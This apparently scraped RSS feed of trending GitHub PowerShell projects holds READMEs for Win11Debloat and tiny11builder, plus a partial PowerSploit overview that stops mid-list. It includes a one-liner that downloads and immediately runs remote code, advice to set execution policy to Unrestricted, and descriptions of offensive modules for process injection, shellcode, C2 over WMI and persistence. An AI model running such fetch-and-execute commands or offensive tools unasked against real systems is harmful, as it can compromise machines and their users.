<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>GitHub PowerShell Monthly Trending</title>
    <description>Monthly Trending of PowerShell in GitHub</description>
    <pubDate>Wed, 13 Aug 2025 01:55:55 GMT</pubDate>
    <link>http://mshibanami.github.io/GitHubTrendingRSS</link>
    
    <item>
      <title>Raphire/Win11Debloat</title>
      <link>https://github.com/Raphire/Win11Debloat</link>
      <description>&lt;p&gt;A simple, easy to use PowerShell script to remove pre-installed apps, disable telemetry, as well as perform various other changes to customize, declutter and improve your Windows experience. Win11Debloat works for both Windows 10 and Windows 11.&lt;/p&gt;&lt;hr&gt;&lt;div align=&quot;center&quot; markdown=&quot;1&quot;&gt; 
 &lt;sup&gt;Special thanks to:&lt;/sup&gt; 
 &lt;br /&gt; 
 &lt;br /&gt; 
 &lt;a href=&quot;https://www.warp.dev/windebloat&quot;&gt; &lt;img alt=&quot;Warp sponsorship&quot; width=&quot;400&quot; src=&quot;https://github.com/user-attachments/assets/c21102f7-bab9-4344-a731-0cf6b341cab2&quot; /&gt; &lt;/a&gt; 
 &lt;h3&gt;&lt;a href=&quot;https://www.warp.dev/windebloat&quot;&gt;Warp, the intelligent terminal for developers&lt;/a&gt;&lt;/h3&gt; 
 &lt;p&gt;&lt;a href=&quot;https://www.warp.dev/windebloat&quot;&gt;Available for MacOS, Linux, &amp;amp; Windows&lt;/a&gt;&lt;br /&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;hr /&gt; 
&lt;h1&gt;Win11Debloat&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/Raphire/Win11Debloat/releases/latest&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/v/release/Raphire/Win11Debloat?style=for-the-badge&amp;amp;label=Latest%20release&quot; alt=&quot;GitHub Release&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/discussions&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Join-the%20Discussion-2D9F2D?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white&quot; alt=&quot;Join the Discussion&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Documentation-_?style=for-the-badge&amp;amp;logo=bookstack&amp;amp;color=grey&quot; alt=&quot;Static Badge&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Win11Debloat is a simple, easy to use and lightweight PowerShell script that allows you to quickly declutter and improve your Windows experience. It can remove pre-installed bloatware apps, disable telemetry, remove intrusive interface elements and much more. No need to painstakingly go through all the settings yourself or remove apps one by one. Win11Debloat makes the process quick and easy!&lt;/p&gt; 
&lt;p&gt;The script also includes many features that system administrators will enjoy. Such as support for Windows Audit mode, the option to make changes to other Windows users and the ability to run the script without requiring user input during runtime. Please refer to our &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/&quot;&gt;wiki&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Raphire/Win11Debloat/master/Assets/menu.png&quot; alt=&quot;Win11Debloat Menu&quot; /&gt;&lt;/p&gt; 
&lt;h4&gt;Did this script help you? Please consider buying me a cup of coffee to support my work&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://ko-fi.com/M4M5C6UPC&quot;&gt;&lt;img src=&quot;https://ko-fi.com/img/githubbutton_sm.svg?sanitize=true&quot; alt=&quot;ko-fi&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!Warning] Great care went into making sure this script does not unintentionally break any OS functionality, but use at your own risk! If you run into any issues, please report them &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/issues&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Quick method&lt;/h3&gt; 
&lt;p&gt;Download &amp;amp; run the script automatically via PowerShell.&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Open PowerShell or Terminal, preferably as an administrator.&lt;/li&gt; 
 &lt;li&gt;Copy and paste the command below into PowerShell:&lt;/li&gt; 
&lt;/ol&gt; 
&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;&amp;amp; ([scriptblock]::Create((irm &quot;https://debloat.raphi.re/&quot;)))
&lt;/code&gt;&lt;/pre&gt; 
&lt;ol start=&quot;3&quot;&gt; 
 &lt;li&gt;Wait for the script to automatically download Win11Debloat.&lt;/li&gt; 
 &lt;li&gt;Carefully read through and follow the on-screen instructions.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;This method supports parameters to customize the behaviour of the script. Please click &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/How-To-Use#parameters&quot;&gt;here&lt;/a&gt; for more information.&lt;/p&gt; 
&lt;h3&gt;Traditional method&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Manually download &amp;amp; run the script.&lt;/summary&gt;
 &lt;br /&gt; 
 &lt;ol&gt; 
  &lt;li&gt;&lt;a href=&quot;https://github.com/Raphire/Win11Debloat/releases/latest&quot;&gt;Download the latest version of the script&lt;/a&gt;, and extract the .ZIP file to your desired location.&lt;/li&gt; 
  &lt;li&gt;Navigate to the Win11Debloat folder&lt;/li&gt; 
  &lt;li&gt;Double click the &lt;code&gt;Run.bat&lt;/code&gt; file to start the script. NOTE: If the console window immediately closes and nothing happens, try the advanced method below.&lt;/li&gt; 
  &lt;li&gt;Accept the Windows UAC prompt to run the script as administrator, this is required for the script to function.&lt;/li&gt; 
  &lt;li&gt;Carefully read through and follow the on-screen instructions.&lt;/li&gt; 
 &lt;/ol&gt; 
&lt;/details&gt; 
&lt;h3&gt;Advanced method&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Manually download the script &amp;amp; run the script via PowerShell. Recommended for advanced users.&lt;/summary&gt;
 &lt;br /&gt; 
 &lt;ol&gt; 
  &lt;li&gt;&lt;a href=&quot;https://github.com/Raphire/Win11Debloat/releases/latest&quot;&gt;Download the latest version of the script&lt;/a&gt;, and extract the .ZIP file to your desired location.&lt;/li&gt; 
  &lt;li&gt;Open PowerShell or Terminal as an administrator.&lt;/li&gt; 
  &lt;li&gt;Temporarily enable PowerShell execution by entering the following command:&lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;Set-ExecutionPolicy Unrestricted -Scope Process -Force
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ol start=&quot;4&quot;&gt; 
  &lt;li&gt;In PowerShell, navigate to the directory where the files were extracted. Example: &lt;code&gt;cd c:\Win11Debloat&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;Now run the script by entering the following command:&lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;.\Win11Debloat.ps1
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ol start=&quot;6&quot;&gt; 
  &lt;li&gt;Carefully read through and follow the on-screen instructions.&lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;p&gt;This method supports parameters to customize the behaviour of the script. Please click &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/How-To-Use#parameters&quot;&gt;here&lt;/a&gt; for more information.&lt;/p&gt; 
&lt;/details&gt; 
&lt;h2&gt;Features&lt;/h2&gt; 
&lt;p&gt;Below is an overview of the key features and functionality offered by Win11Debloat. For more information about what features are included in the default mode please refer to &lt;a href=&quot;https://raw.githubusercontent.com/Raphire/Win11Debloat/master/#default-settings&quot;&gt;this section&lt;/a&gt; below.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!Tip] All of the changes made by Win11Debloat can easily be reverted and almost all of the apps can be reinstalled through the Microsoft Store. A full guide on how to revert changes can be found &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/Reverting-Changes&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h4&gt;App Removal&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Remove a wide variety of preinstalled apps. Click &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/App-Removal&quot;&gt;here&lt;/a&gt; for more info.&lt;/li&gt; 
 &lt;li&gt;Remove or replace all pinned apps from start for the current user, or for all existing &amp;amp; new users. (W11 only)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Telemetry, Tracking &amp;amp; Suggested Content&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Disable telemetry, diagnostic data, activity history, app-launch tracking &amp;amp; targeted ads.&lt;/li&gt; 
 &lt;li&gt;Disable tips, tricks, suggestions and ads in start, settings, notifications, File Explorer, and on the lockscreen.&lt;/li&gt; 
 &lt;li&gt;Disable the &#39;Windows Spotlight&#39; desktop background option.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Bing Web Search, Copilot &amp;amp; AI Features&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Disable &amp;amp; remove Bing web search, Bing AI and Cortana from Windows search.&lt;/li&gt; 
 &lt;li&gt;Disable &amp;amp; remove Microsoft Copilot. (W11 only)&lt;/li&gt; 
 &lt;li&gt;Disable Windows Recall snapshots. (W11 only)&lt;/li&gt; 
 &lt;li&gt;Disable AI Features in Paint (W11 only)&lt;/li&gt; 
 &lt;li&gt;Disable AI Features in Notepad (W11 only)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Personalisation&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Enable dark mode for system and apps.&lt;/li&gt; 
 &lt;li&gt;Disable transparency, animations and visual effects.&lt;/li&gt; 
 &lt;li&gt;Turn off Enhance Pointer Precision, also known as mouse acceleration.&lt;/li&gt; 
 &lt;li&gt;Disable the Sticky Keys keyboard shortcut. (W11 only)&lt;/li&gt; 
 &lt;li&gt;Restore the old Windows 10 style context menu. (W11 only)&lt;/li&gt; 
 &lt;li&gt;Hide the &#39;Include in library&#39;, &#39;Give access to&#39; and &#39;Share&#39; options from the context menu. (W10 only)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;File Explorer&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Change the default location that File Explorer opens to.&lt;/li&gt; 
 &lt;li&gt;Show hidden files, folders and drives.&lt;/li&gt; 
 &lt;li&gt;Show file extensions for known file types.&lt;/li&gt; 
 &lt;li&gt;Hide the Home or Gallery section from the File Explorer navigation pane. (W11 only)&lt;/li&gt; 
 &lt;li&gt;Hide the 3D objects, music or OneDrive folder from the File Explorer navigation pane. (W10 only)&lt;/li&gt; 
 &lt;li&gt;Hide duplicate removable drive entries from the File Explorer navigation pane, so only the entry under &#39;This PC&#39; remains.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Taskbar&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Align taskbar icons to the left. (W11 only)&lt;/li&gt; 
 &lt;li&gt;Hide or change the search icon/box on the taskbar. (W11 only)&lt;/li&gt; 
 &lt;li&gt;Hide the taskview button from the taskbar. (W11 only)&lt;/li&gt; 
 &lt;li&gt;Disable the widgets service &amp;amp; hide icon from the taskbar.&lt;/li&gt; 
 &lt;li&gt;Hide the chat (meet now) icon from the taskbar.&lt;/li&gt; 
 &lt;li&gt;Enable the &#39;End Task&#39; option in the taskbar right click menu. (W11 only)&lt;/li&gt; 
 &lt;li&gt;Enable the &#39;Last Active Click&#39; behavior in the taskbar app area. This allows you to repeatedly click on an application&#39;s icon in the taskbar to switch focus between the open windows of that application.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Start&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Disable the recommended section in the start menu. (W11 only)&lt;/li&gt; 
 &lt;li&gt;Disable the Phone Link mobile devices integration in the start menu. (W11 only)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Other&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Disable Xbox game/screen recording, this also stops gaming overlay popups.&lt;/li&gt; 
 &lt;li&gt;Disable Fast Start-up to ensure a full shutdown.&lt;/li&gt; 
 &lt;li&gt;Option to &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/Advanced-Features#running-as-another-user&quot;&gt;apply changes to a different user&lt;/a&gt;, instead of the currently logged in user.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/Advanced-Features#sysprep-mode&quot;&gt;Sysprep mode&lt;/a&gt; to apply changes to the Windows Default user profile. Afterwards, all new users will have the changes automatically applied to them.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Default Settings&lt;/h3&gt; 
&lt;p&gt;Win11Debloat offers a default mode that allows you to quickly and easily apply the changes that are recommended for most people. This includes uninstalling apps that most would consider bloatware, removing many annoying distractions and disabling telemetry and tracking. To apply the default settings, launch the script as you normally would and select option &lt;code&gt;1&lt;/code&gt; in the script menu. Alternatively, you can launch the script with the &lt;code&gt;-RunDefaults&lt;/code&gt; parameter. Example:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-Powershell&quot;&gt;&amp;amp; ([scriptblock]::Create((irm &quot;https://debloat.raphi.re/&quot;))) -RunDefaults
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Changes included in the default mode&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Remove the default selection of bloatware apps. (See below for full list)&lt;/li&gt; 
 &lt;li&gt;Disable telemetry, diagnostic data, activity history, app-launch tracking &amp;amp; targeted ads.&lt;/li&gt; 
 &lt;li&gt;Disable tips, tricks, suggestions and ads in start, settings, notifications, File Explorer, and on the lockscreen.&lt;/li&gt; 
 &lt;li&gt;Disable &amp;amp; remove Bing web search, Bing AI and Cortana from Windows search.&lt;/li&gt; 
 &lt;li&gt;Disable &amp;amp; remove Microsoft Copilot. (W11 only)&lt;/li&gt; 
 &lt;li&gt;Disable Fast Start-up to ensure a full shutdown.&lt;/li&gt; 
 &lt;li&gt;Show file extensions for known file types.&lt;/li&gt; 
 &lt;li&gt;Hide the 3D objects folder under &#39;This pc&#39; from File Explorer. (W10 only)&lt;/li&gt; 
 &lt;li&gt;Disable the widget service &amp;amp; hide the icon from the taskbar.&lt;/li&gt; 
 &lt;li&gt;Hide the Chat (meet now) icon from the taskbar.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Apps that ARE removed as part of the default mode&lt;/h4&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to expand&lt;/summary&gt; 
 &lt;blockquote&gt; 
  &lt;pre&gt;&lt;code&gt;Microsoft bloat:
- Clipchamp.Clipchamp  
- Microsoft.3DBuilder  
- Microsoft.549981C3F5F10 (Cortana app)
- Microsoft.BingFinance  
- Microsoft.BingFoodAndDrink 
- Microsoft.BingHealthAndFitness
- Microsoft.BingNews  
- Microsoft.BingSearch* (Bing web search in Windows)
- Microsoft.BingSports  
- Microsoft.BingTranslator  
- Microsoft.BingTravel   
- Microsoft.BingWeather  
- Microsoft.Copilot
- Microsoft.Getstarted (Cannot be uninstalled in Windows 11)
- Microsoft.Messaging  
- Microsoft.Microsoft3DViewer  
- Microsoft.MicrosoftJournal
- Microsoft.MicrosoftOfficeHub  
- Microsoft.MicrosoftPowerBIForWindows  
- Microsoft.MicrosoftSolitaireCollection  
- Microsoft.MicrosoftStickyNotes  
- Microsoft.MixedReality.Portal  
- Microsoft.NetworkSpeedTest  
- Microsoft.News  
- Microsoft.Office.OneNote (Discontinued UWP version only, does not remove new MS365 versions)
- Microsoft.Office.Sway  
- Microsoft.OneConnect  
- Microsoft.Print3D  
- Microsoft.SkypeApp  
- Microsoft.Todos  
- Microsoft.WindowsAlarms  
- Microsoft.WindowsFeedbackHub  
- Microsoft.WindowsMaps  
- Microsoft.WindowsSoundRecorder  
- Microsoft.XboxApp (Old Xbox Console Companion App, no longer supported)
- Microsoft.ZuneVideo  
- MicrosoftCorporationII.MicrosoftFamily (Microsoft Family Safety)
- MicrosoftTeams (Old personal version of MS Teams from the MS Store)
- MSTeams (New MS Teams app)

Third party bloat:
- ACGMediaPlayer  
- ActiproSoftwareLLC  
- AdobeSystemsIncorporated.AdobePhotoshopExpress  
- Amazon.com.Amazon  
- AmazonVideo.PrimeVideo
- Asphalt8Airborne   
- AutodeskSketchBook  
- CaesarsSlotsFreeCasino  
- COOKINGFEVER  
- CyberLinkMediaSuiteEssentials  
- DisneyMagicKingdoms  
- Disney 
- Dolby  
- DrawboardPDF  
- Duolingo-LearnLanguagesforFree  
- EclipseManager  
- Facebook  
- FarmVille2CountryEscape  
- fitbit  
- Flipboard  
- HiddenCity  
- HULULLC.HULUPLUS  
- iHeartRadio  
- Instagram
- king.com.BubbleWitch3Saga  
- king.com.CandyCrushSaga  
- king.com.CandyCrushSodaSaga  
- LinkedInforWindows  
- MarchofEmpires  
- Netflix  
- NYTCrossword  
- OneCalendar  
- PandoraMediaInc  
- PhototasticCollage  
- PicsArt-PhotoStudio  
- Plex  
- PolarrPhotoEditorAcademicEdition  
- Royal Revolt  
- Shazam  
- Sidia.LiveWallpaper  
- SlingTV  
- Speed Test  
- Spotify  
- TikTok
- TuneInRadio  
- Twitter  
- Viber  
- WinZipUniversal  
- Wunderlist  
- XING

* App is removed when disabling Bing in Windows search.
&lt;/code&gt;&lt;/pre&gt; 
 &lt;/blockquote&gt; 
&lt;/details&gt; 
&lt;h4&gt;Apps that are NOT removed as part of the default mode&lt;/h4&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to expand&lt;/summary&gt; 
 &lt;blockquote&gt; 
  &lt;pre&gt;&lt;code&gt;General apps that are not removed by default:
- Microsoft.Edge (Edge browser, only removeable in the EEA)
- Microsoft.GetHelp (Required for some Windows 11 Troubleshooters)
- Microsoft.MSPaint (Paint 3D)
- Microsoft.OutlookForWindows* (New mail app)
- Microsoft.OneDrive (OneDrive consumer)
- Microsoft.Paint (Classic Paint)
- Microsoft.People* (Required for &amp;amp; included with Mail &amp;amp; Calendar)
- Microsoft.ScreenSketch (Snipping Tool)
- Microsoft.Whiteboard (Only preinstalled on devices with touchscreen and/or pen support)
- Microsoft.Windows.Photos
- Microsoft.WindowsCalculator
- Microsoft.WindowsCamera
- Microsoft.WindowsNotepad
- Microsoft.windowscommunicationsapps* (Mail &amp;amp; Calendar)
- Microsoft.WindowsStore (Microsoft Store, NOTE: This app cannot be reinstalled!)
- Microsoft.WindowsTerminal (New default terminal app in Windows 11)
- Microsoft.YourPhone (Phone Link)
- Microsoft.Xbox.TCUI (UI framework, removing this may break MS store, photos and certain games)
- Microsoft.ZuneMusic (Modern Media Player)
- MicrosoftWindows.CrossDevice (Phone integration within File Explorer, Camera and more)

HP apps that are not removed by default:
- AD2F1837.HPAIExperienceCenter*
- AD2F1837.HPConnectedMusic*
- AD2F1837.HPConnectedPhotopoweredbySnapfish*
- AD2F1837.HPDesktopSupportUtilities*
- AD2F1837.HPEasyClean*
- AD2F1837.HPFileViewer*
- AD2F1837.HPJumpStarts*
- AD2F1837.HPPCHardwareDiagnosticsWindows*
- AD2F1837.HPPowerManager*
- AD2F1837.HPPrinterControl*
- AD2F1837.HPPrivacySettings*
- AD2F1837.HPQuickDrop*
- AD2F1837.HPQuickTouch*
- AD2F1837.HPRegistration*
- AD2F1837.HPSupportAssistant*
- AD2F1837.HPSureShieldAI*
- AD2F1837.HPSystemInformation*
- AD2F1837.HPWelcome*
- AD2F1837.HPWorkWell*
- AD2F1837.myHP*

Gaming related apps that are not removed by default:
- Microsoft.GamingApp* (Modern Xbox Gaming App, required for installing some games)
- Microsoft.XboxGameOverlay* (Game overlay, required for some games)
- Microsoft.XboxGamingOverlay* (Game overlay, required for some games)
- Microsoft.XboxIdentityProvider (Xbox sign-in framework, required for some games)
- Microsoft.XboxSpeechToTextOverlay (Might be required for some games, NOTE: This app cannot be reinstalled!)

Developer related apps that are not removed by default:
- Microsoft.PowerAutomateDesktop*
- Microsoft.RemoteDesktop*
- Windows.DevHome*

* Can be removed by running the script with the relevant parameter. (Please refer to the wiki for more details)
&lt;/code&gt;&lt;/pre&gt; 
 &lt;/blockquote&gt; 
&lt;/details&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;Win11Debloat is licensed under the MIT license. See the LICENSE file for more information.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>ntdevlabs/tiny11builder</title>
      <link>https://github.com/ntdevlabs/tiny11builder</link>
      <description>&lt;p&gt;Scripts to build a trimmed-down Windows 11 image.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;tiny11builder&lt;/h1&gt; 
&lt;p&gt;Scripts to build a trimmed-down Windows 11 image - now in &lt;strong&gt;PowerShell&lt;/strong&gt;! &lt;br /&gt; Tiny11 builder, now completely overhauled. &lt;br /&gt; After more than a year (for which I am so sorry) of no updates, tiny11 builder is now a much more complete and flexible solution - one script fits all. Also, it is a steppingstone for an even more fleshed-out solution. &lt;br /&gt; You can now use it on ANY Windows 11 release (not just a specific build), as well as ANY language or architecture. This is made possible thanks to the much-improved scripting capabilities of PowerShell, compared to the older Batch release. &lt;br /&gt; Since it is written in PowerShell, you need to set the execution policy to &lt;code&gt;Unrestricted&lt;/code&gt;, so that you could run the script. If you haven&#39;t done this before, make sure to run &lt;code&gt;Set-ExecutionPolicy unrestricted&lt;/code&gt; as administrator in PowerShell before running the script, otherwise it would just crash.&lt;/p&gt; 
&lt;p&gt;This is a script created to automate the build of a streamlined Windows 11 image, similar to tiny11. My main goal is to use only Microsoft utilities like DISM, and no utilities from external sources. The only executable included is &lt;strong&gt;oscdimg.exe&lt;/strong&gt;, which is provided in the Windows ADK and it is used to create bootable ISO images. Also included is an unattended answer file, which is used to bypass the Microsoft Account on OOBE and to deploy the image with the &lt;code&gt;/compact&lt;/code&gt; flag. It&#39;s open-source, &lt;strong&gt;so feel free to add or remove anything you want!&lt;/strong&gt; Feedback is also much appreciated.&lt;/p&gt; 
&lt;p&gt;Also, for the very first time, &lt;strong&gt;introducing tiny11 core builder&lt;/strong&gt;! A more powerful script, designed for a quick and dirty development testbed. Just the bare minimun, none of the fluff. This script generates a significantly reduced Windows 11 image. However, it&#39;s not suitable for regular use due to its lack of serviceability - you can&#39;t add languages, updates, or features post-creation. tiny11 Core is not a full Windows 11 substitute but a rapid testing or development tool, potentially useful for VM environments.&lt;/p&gt; 
&lt;p&gt;Instructions:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Download Windows 11 from the Microsoft website (&lt;a href=&quot;https://www.microsoft.com/software-download/windows11&quot;&gt;https://www.microsoft.com/software-download/windows11&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;Mount the downloaded ISO image using Windows Explorer.&lt;/li&gt; 
 &lt;li&gt;Select the drive letter where the image is mounted (only the letter, no colon (:))&lt;/li&gt; 
 &lt;li&gt;Select the SKU that you want the image to be based.&lt;/li&gt; 
 &lt;li&gt;Sit back and relax :)&lt;/li&gt; 
 &lt;li&gt;When the image is completed, you will see it in the folder where the script was extracted, with the name tiny11.iso&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;What is removed:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Clipchamp&lt;/li&gt; 
 &lt;li&gt;News&lt;/li&gt; 
 &lt;li&gt;Weather&lt;/li&gt; 
 &lt;li&gt;Xbox (although Xbox Identity provider is still here, so it should be possible to be reinstalled with no issues)&lt;/li&gt; 
 &lt;li&gt;GetHelp&lt;/li&gt; 
 &lt;li&gt;GetStarted&lt;/li&gt; 
 &lt;li&gt;Office Hub&lt;/li&gt; 
 &lt;li&gt;Solitaire&lt;/li&gt; 
 &lt;li&gt;PeopleApp&lt;/li&gt; 
 &lt;li&gt;PowerAutomate&lt;/li&gt; 
 &lt;li&gt;ToDo&lt;/li&gt; 
 &lt;li&gt;Alarms&lt;/li&gt; 
 &lt;li&gt;Mail and Calendar&lt;/li&gt; 
 &lt;li&gt;Feedback Hub&lt;/li&gt; 
 &lt;li&gt;Maps&lt;/li&gt; 
 &lt;li&gt;Sound Recorder&lt;/li&gt; 
 &lt;li&gt;Your Phone&lt;/li&gt; 
 &lt;li&gt;Media Player&lt;/li&gt; 
 &lt;li&gt;QuickAssist&lt;/li&gt; 
 &lt;li&gt;Internet Explorer&lt;/li&gt; 
 &lt;li&gt;Tablet PC Math&lt;/li&gt; 
 &lt;li&gt;Edge&lt;/li&gt; 
 &lt;li&gt;OneDrive&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;For tiny11 core:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;all of the above +&lt;/li&gt; 
 &lt;li&gt;Windows Component Store (WinSxS)&lt;/li&gt; 
 &lt;li&gt;Windows Defender (only disabled, can be enabled back if needed)&lt;/li&gt; 
 &lt;li&gt;Windows Update (Windows Update wouldn&#39;t work anyway without WinSxS, so enabling it would only put the system in a state where it would try to update but fail spectacularily)&lt;/li&gt; 
 &lt;li&gt;WinRE&lt;/li&gt; 
&lt;/ul&gt; 
&lt;br /&gt; Keep in mind that **you cannot add back features in tiny11 core**! 
&lt;br /&gt; 
&lt;br /&gt; You will be asked during image creation if you want to enable .net 3.5 support! 
&lt;br /&gt; Known issues: 
&lt;ol&gt; 
 &lt;li&gt;Although Edge is removed, there are some remnants in the Settings. But the app in itself is deleted. You can install any browser using WinGet (after you update the app using Microsoft Store). If you want Edge, Copilot and Web Search back, simply install Edge using Winget: &lt;code&gt;winget install edge&lt;/code&gt;.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;br /&gt; Note: You might have to update Winget before being able to install any apps, using Microsoft Store. 
&lt;br /&gt; 
&lt;br /&gt; 2. Outlook and Dev Home might reappear after some time. 
&lt;br /&gt; 
&lt;br /&gt; 3. If you are using this script on arm64, you might see a glimpse of an error while running the script. This is caused by the fact that the arm64 image doesn&#39;t have OneDriveSetup.exe included in the System32 folder. 
&lt;p&gt;Features to be implemented:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;del&gt;disabling telemetry&lt;/del&gt; (Implemented in the 04-29-24 release!)&lt;/li&gt; 
 &lt;li&gt;more ad suppression&lt;/li&gt; 
 &lt;li&gt;improved language and arch detection&lt;/li&gt; 
 &lt;li&gt;more flexibility in what to keep and what to delete&lt;/li&gt; 
 &lt;li&gt;maybe a GUI???&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;And that&#39;s pretty much it for now! Thanks for trying it and let me know how you like it!&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>PowerShellMafia/PowerSploit</title>
      <link>https://github.com/PowerShellMafia/PowerSploit</link>
      <description>&lt;p&gt;PowerSploit - A PowerShell Post-Exploitation Framework&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;This project is no longer supported&lt;/h2&gt; 
&lt;h3&gt;PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. PowerSploit is comprised of the following modules and scripts:&lt;/h3&gt; 
&lt;h2&gt;CodeExecution&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Execute code on a target machine.&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-DllInjection&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Injects a Dll into the process ID of your choosing.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-ReflectivePEInjection&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-Shellcode&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Injects shellcode into the process ID of your choosing or within PowerShell locally.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-WmiCommand&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Executes a PowerShell ScriptBlock on a target computer and returns its formatted output using WMI as a C2 channel.&lt;/p&gt; 
&lt;h2&gt;ScriptModification&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Modify and/or prepare scripts for execution on a compromised machine.&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Out-EncodedCommand&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Out-CompressedDll&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Compresses, Base-64 encodes, and outputs generated code to load a managed dll in memory.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Out-EncryptedScript&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Encrypts text files/scripts.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Remove-Comment&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Strips comments and extra whitespace from a script.&lt;/p&gt; 
&lt;h2&gt;Persistence&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Add persistence capabilities to a PowerShell script&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;New-UserPersistenceOption&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Configure user-level persistence options for the Add-Persistence function.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;New-ElevatedPersistenceOption&lt;/code&gt;&lt;/h4&gt; 
